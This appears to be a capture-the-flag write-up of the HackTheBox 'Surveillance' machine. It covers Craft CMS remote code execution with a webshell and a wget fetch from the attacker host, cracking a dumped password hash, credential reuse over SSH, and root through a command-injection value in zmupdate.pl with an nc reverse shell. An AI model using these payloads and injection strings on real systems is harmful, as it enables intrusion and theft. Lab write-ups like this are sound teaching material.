---

categories: [HackTheBox]
tags: [ Public_Exploit, Port_Forwording, PrivEsc, Password_Cracking]
img_path: /assets/images/
image:
  alt: Linux Medium Level Machine 🧭
  width: "1200"
  height: "630"
  path: https://pbs.twimg.com/media/GAwK6LdWcAQTTOO.jpg
---
## Port Scan Results ⤵️
```bash
┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance]
└─$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.245 -Pn
Nmap scan report for 10.10.11.245
Host is up (0.29s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
22/tcp    open     tcpwrapped
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp    open     tcpwrapped
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
20485/tcp filtered unknown
56302/tcp filtered unknown

```
## Web Enumeration ⤵️

Upon checking port 80 and being redirected to `surveillance.htb`, I set the hosts file and loaded the site:
![Image](Pasted%20image%2020240218223934.png)
_surveillance HTB_
While accessing port 80:
![Image](Pasted%20image%2020240218224103.png)
_While hovering over `Craft CMS`, I identified its version and the source code._
Further reconnaissance revealed a potential exploit related to `Craft CMS` version 4.4.14, vulnerable to CVE-2023-41892. An exploit enabling remote code execution was discovered ([Exploit](https://github.com/Faelian/CraftCMS_CVE-2023-41892/tree/main)).

Resulting in remote code execution, providing access to the shell:

```bash
┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance]
└─$ python3 exploit.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you are done

[!] Enjoy your shell

> wget http://10.10.14.81/php_webshell.php

> ls
cpresources
css
fonts
images
img
index.php
js
shell.php
web.config

> 
```

An `sql` file was found at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip`, containing sensitive data, including password hashes.

I immediately copy the `zip` file into the website location like this and downloaded it through website ->
```bash
┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance]
└─$ python3 exploit.py http://surveillance.htb/
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb//shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you are done

[!] Enjoy your shell

> cp ../storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip .

> ls
cpresources
css
fonts
images
img
index.php
js
shell.php
surveillance--2023-10-17-202801--v4.4.14.sql.zip
web.config
```
I got this sql data from this file that contains the password hash of matthew ⏬ 
```sql

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```
Using the site [hashes.com](https://hashes.com/en/decrypt/hash) to crack the password hash revealed: `starcraft122490`.🔻
![Image](Pasted%20image%2020240217215356.png)

Subsequently, accessing SSH as **matthew**: 

## SSH SHELL 🔜

```bash
┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance]
└─$ ssh matthew@10.10.11.245                           
matthew@10.10.11.245 is password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 18 05:15:29 PM UTC 2024

  System load:  1.23828125        Processes:             260
  Usage of /:   84.2% of 5.91GB   Users logged in:       0
  Memory usage: 68%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb 18 16:32:58 2024 from 10.10.14.181
matthew@surveillance:~$ whoami
matthew
matthew@surveillance:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
matthew@surveillance:~$ ls -al
total 28
drwxrwx--- 3 matthew matthew 4096 Nov  9 12:45 .
drwxr-xr-x 4 root    root    4096 Oct 17 11:20 ..
lrwxrwxrwx 1 matthew matthew    9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3771 Apr 21  2023 .bashrc
drwx------ 2 matthew matthew 4096 Sep 19 11:26 .cache
-rw-r--r-- 1 matthew matthew  807 Apr 21  2023 .profile
-rw-r----- 1 root    matthew   33 Feb 18 16:32 user.txt
matthew@surveillance:~$ 
```

After successfully logging in, I identified additional users, including `zoneminder`, and obtained credentials from `/usr/share/zoneminder/www/api/app/Config/database.php`. 🔽 

```bash
matthew@surveillance:~$ find / -group zoneminder -type f 2>/dev/null
/usr/share/zoneminder/www/fonts/material-icons.woff2
/usr/share/zoneminder/www/fonts/fontawesome-webfont.woff
/usr/share/zoneminder/www/fonts/fontawesome-webfont.eot
....
...
/usr/share/zoneminder/www/api/lib/Cake/Config/config.php
/usr/share/zoneminder/www/api/app/Config/database.php
```
I looked into this `database.php` file and got some credentials ->
```php
matthew@surveillance:~$ cat /usr/share/zoneminder/www/api/app/Config/database.php
<?php
[...]
class DATABASE_CONFIG {

	/*public $default = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'login' => ZM_DB_USER,
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'ssl_ca' => ZM_DB_SSL_CA_CERT,
		'ssl_key' => ZM_DB_SSL_CLIENT_KEY,
		'ssl_cert' => ZM_DB_SSL_CLIENT_CERT,
		'prefix' => '',
		'encoding' => 'utf8',
	);*/

	public $test = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'host' => 'localhost',
		'login' => 'zmuser',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
		'prefix' => '',
		//'encoding' => 'utf8',
	);

	public function __construct() {
		if (strpos(ZM_DB_HOST, ':')):
			$array = explode(':', ZM_DB_HOST, 2);
                        if (ctype_digit($array[1])):
				$this->default['host'] = $array[0];
				$this->default['port'] = $array[1];
			else:
				$this->default['unix_socket'] = $array[1];
			endif;
		else:
			$this->default['host'] = ZM_DB_HOST;
		endif;
	}
}
matthew@surveillance:~$
```
Now I need to search for `zoneminder` running version ->
![Image](Pasted%20image%2020240218220925.png)
_zoneminder has Version 1.36.32_
Exploring further, I discovered `zoneminder` version 1.36.32, vulnerable to [CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035).
I used this exploit and I got the reverse shell like this 🔻
![Image](Pasted%20image%2020240218221500.png)
_Unauthenticated Remote Code Execution through exploit_
Exploiting this vulnerability, I gained root access and retrieved the root flag:
```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
zoneminder@surveillance:/usr/share/zoneminder/www$ 
```
I find the same files and I got these ->
```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin/zm[a-zA-Z]*.pl
</share/zoneminder/www$ find /usr/bin/zm[a-zA-Z]*.pl
/usr/bin/zmaudit.pl
/usr/bin/zmcamtool.pl
/usr/bin/zmcontrol.pl
/usr/bin/zmdc.pl
/usr/bin/zmfilter.pl
/usr/bin/zmonvif-probe.pl
/usr/bin/zmonvif-trigger.pl
/usr/bin/zmpkg.pl
/usr/bin/zmrecover.pl
/usr/bin/zmstats.pl
/usr/bin/zmsystemctl.pl
/usr/bin/zmtelemetry.pl
/usr/bin/zmtrack.pl
/usr/bin/zmtrigger.pl
/usr/bin/zmupdate.pl
/usr/bin/zmvideo.pl
/usr/bin/zmwatch.pl
/usr/bin/zmx10.pl
zoneminder@surveillance:/usr/share/zoneminder/www$ 
```
I used this `zmupdate.pl` command to execute the shell command like this ->
```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
```
Now lets see the result ➡️
```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
<ser='$(/bin/bash -i)' --pass=ZoneMinderPassword2023

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
bash: no job control in this shell
root@surveillance:/usr/share/zoneminder/www# cd ~
cd ~
root@surveillance:~# whoami
whoami
root@surveillance:~# id
id
```
As you can see the shell is not working properly so I redirected to port 4444 as a reverse shell and now it is working file ->
```bash
┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance/CVE-2023-26035]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.181] from (UNKNOWN) [10.10.11.245] 52892
/bin/sh: 0: can not access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd ~
# ls -al
total 40
drwx------  7 root root 4096 Feb 18 16:32 .
drwxr-xr-x 18 root root 4096 Nov  9 13:19 ..
lrwxrwxrwx  1 root root    9 Sep  6 10:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Sep 19 11:32 .cache
drwxr-xr-x  3 root root 4096 Sep 19 11:31 .config
drwxr-xr-x  3 root root 4096 Sep  8 00:05 .local
lrwxrwxrwx  1 root root    9 Oct 17 16:43 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Feb 18 16:32 root.txt
drwxr-xr-x  2 root root 4096 Oct 21 23:19 .scripts
drwx------  2 root root 4096 Nov  7 20:07 .ssh
# cat root.tx
cat: root.tx: No such file or directory
# cat root.txt
8022945623be5ae2e721aca14e22693e
# 
```
I am root now !!

